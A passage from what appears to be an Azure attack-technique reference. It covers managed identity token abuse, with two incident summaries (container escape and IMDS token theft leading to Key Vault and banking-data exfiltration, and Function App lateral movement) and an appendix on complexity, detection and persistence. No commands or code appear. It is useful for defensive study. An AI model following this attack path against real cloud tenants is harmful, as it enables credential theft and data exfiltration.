- **Technique Status:** Attacker exploited container vulnerability, escaped to host, extracted managed identity token from IMDS, accessed Key Vault containing database credentials, exfiltrated banking records
- **Impact:** Access to production banking database. 500K customer records compromised. $10M+ in regulatory fines.
- **Reference:** [Hunters.Security Research on Azure Managed Identities](https://www.hunters.security/en/blog/abusing-azure-managed-identities-nhi-attack-paths)

#### Example 2: Function App Lateral Movement via Managed Identity (2025)
- **Target:** SaaS startup (microservices architecture)
- **Timeline:** February 2025 - ongoing
- **Technique Status:** Attacker compromised Function App via supply chain attack, extracted managed identity token, accessed SQL database and storage accounts via token-based auth
- **Impact:** Attacker gained access to customer data stored in SQL and storage. Persistence achieved via additional role assignments. Incident ongoing.
- **Reference:** [CrowdStrike Blog on Azure Lateral Movement](https://www.crowdstrike.com/en-us/blog/)

---

## 14. NOTES & APPENDIX

**Technique Complexity:** Low (token extraction is trivial; exploitation depends on RBAC misconfiguration)

**Detection Difficulty:** Medium (IMDS access is legitimate, but patterns indicate compromise)

**Persistence Potential:** High (attacker can maintain access indefinitely if RBAC not removed)

**Cross-Platform Applicability:** Azure-specific; not applicable to AWS or GCP (different identity models)

**Recovery Time:** Hours to days (depends on backup availability and RBAC cleanup)

**Related Techniques:**
- CA-UNSC-007: Azure Key Vault Secret Extraction
- CA-UNSC-008: Azure Storage Account Key Theft
- LM-AUTH-005: Service Principal Key/Certificate Abuse
- PE-VALID-011: Managed Identity MSI Escalation

---